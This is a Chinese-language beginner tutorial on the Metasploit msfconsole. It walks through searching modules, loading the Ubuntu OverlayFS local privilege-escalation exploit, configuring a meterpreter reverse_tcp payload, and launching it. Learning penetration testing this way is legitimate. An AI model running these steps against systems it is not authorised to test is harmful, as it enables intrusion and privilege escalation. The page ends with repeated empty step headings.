# 原创
：  【kali-漏洞利用】（3.2）Metasploit基础（下）:MSF终端利用过程

# 【kali-漏洞利用】（3.2）Metasploit基础（下）:MSF终端利用过程

**目录**

[一、MSF终端简介](#%E4%B8%80%E3%80%81MSF%E7%BB%88%E7%AB%AF%E7%AE%80%E4%BB%8B)

[1.1、概述：](#1.1%E3%80%81%E6%A6%82%E8%BF%B0%EF%BC%9A)

[1.2、通用命令：](#1.2%E3%80%81%E9%80%9A%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%9A)

[二、使用](#%E4%BA%8C%E3%80%81%E4%BD%BF%E7%94%A8)

[2.1、MSFCONSOLE漏洞利用](#2.1%E3%80%81MSFCONSOLE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8)

[第一步：终端启动MSFCONSOLE](#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E7%BB%88%E7%AB%AF%E5%90%AF%E5%8A%A8MSFCONSOLE)

[第二步：寻找模块](#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E5%AF%BB%E6%89%BE%E6%A8%A1%E5%9D%97)

[第三步：使用模块](#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E4%BD%BF%E7%94%A8%E6%A8%A1%E5%9D%97)

[第四步：查看有效选项](#%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E6%9F%A5%E7%9C%8B%E6%9C%89%E6%95%88%E9%80%89%E9%A1%B9)

[第五步：设置payload](#%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E8%AE%BE%E7%BD%AEpayload)

[第六步：执行渗透攻击](#%E7%AC%AC%E5%85%AD%E6%AD%A5%EF%BC%9A%E6%89%A7%E8%A1%8C%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB)

---


## 一、MSF终端简介

> 
<h3>1.1、概述：</h3>
MSF终端(MSFCONSOLE)是目前Metasploit框架最为流行的用户接口，因为MSF终端是Metasploit框架中最灵活、功能最丰富及支持最好的工具之一
<hr/>
MSFCONSOLE主要用于管理Metasploit数据库， 管理会话、配置并启动Metasploit模块。本质上来说， 就是为了利用漏洞， MSFCONSOLE将获取用户连接到主机的信息，以至于用户能启动渗透攻击目标系统


> 
<h3>1.2、通用命令：</h3>
help: 查看执行命令的帮助信息<br/> use module: 加载选择的模块<br/> set optionname module: 为模块设置不同的选项<br/> run: 启动一个非渗透攻击模块<br/> search module: 搜索一个特定的模块<br/> exit: 退出MSFCONSOLE


---


---


## 二、使用

> 
<h3>2.1、MSFCONSOLE漏洞利用</h3>
<h4>第一步：终端启动MSFCONSOLE</h4>
以管理员身份运行
sudo msfconsole<br/><img alt="" height="438" src="https://img-blog.csdnimg.cn/1ad8543afbe34a9a8dda439c497f278f.png" width="836"/>
出现msf提示符了，就登录成功了 
<hr/>
<h4>第二步：寻找模块</h4>
使用search加上自己想找的模块（相当于模糊查询）
使用search命令搜索所有有效的Linux模块
search linux

<hr/>
<h4>第三步：使用模块</h4>
使用use+模块名
Ubuntu内核OverlayFS权限逃逸漏洞
use exploit/linux/local/cve_2021_3493_overlayfs
(就试一下这第一个)

<hr/>
<h4>第四步：查看有效选项</h4>
show options
可以看见有4个模块，且都是必须的
Current Setting（当前设置）
已经有3个已经设置了

还需要设置session
<pre><code>Module options (exploit/linux/local/cve_2021_3493_overlayfs):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   COMPILE  Auto             yes       Compile on target (Accepted: Auto, True, False)
   SESSION                   yes       The session to run this module on


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.190.149  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

</code></pre>
<hr/>
<h4>第五步：设置payload</h4>
使用set + payload名 + 设置的东西
(像这一样)

<hr/>
<h4>第六步：执行渗透攻击</h4>
输入exploit


#### 第一步：终端启动MSFCONSOLE

---


#### 第三步：使用模块

---


#### 第五步：设置payload
